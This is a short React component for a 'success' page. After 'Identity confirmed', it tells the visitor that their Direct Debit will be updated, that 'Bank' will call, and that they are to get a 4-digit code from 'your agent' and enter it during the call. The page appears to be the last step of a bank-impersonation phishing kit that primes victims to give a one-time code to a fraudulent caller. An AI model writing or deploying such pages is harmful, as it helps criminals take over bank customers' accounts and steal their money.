// src/pages/SuccessPage.jsx
import React from "react";
import { FaCheckCircle } from "react-icons/fa";

export default function SuccessPage() {
  return (
    <div className="min-h-screen flex items-center justify-center bg-white px-4">
      <div className="bg-white/80 rounded-2xl shadow-2xl p-10 max-w-lg text-center animate-fadeIn">
        <FaCheckCircle className="text-green-600 text-6xl mx-auto mb-4 animate-bounce" />
        <h1 className="text-2xl md:text-3xl font-bold text-gray-800 mb-4">
          You're Almost Done!
        </h1>
        <p className="text-gray-600 mb-2">Identity confirmed.</p>
        <p className="text-gray-600">
          Your Direct Debit will be updated within 24 hours. You will receive a
          call from Bank—
          <p className="text-gray-600">
            please get the 4-digit code from your agent and enter it during the
            call after the beep.
          </p>
        </p>
        {/* <button
          onClick={() => (window.location.href = "/")}
          className="mt-6 px-6 py-3 bg-purple-700 hover:bg-purple-800 text-white rounded-xl shadow-lg transition duration-300"
        >
          Go Back Home
        </button> */}
      </div>
    </div>
  );
}
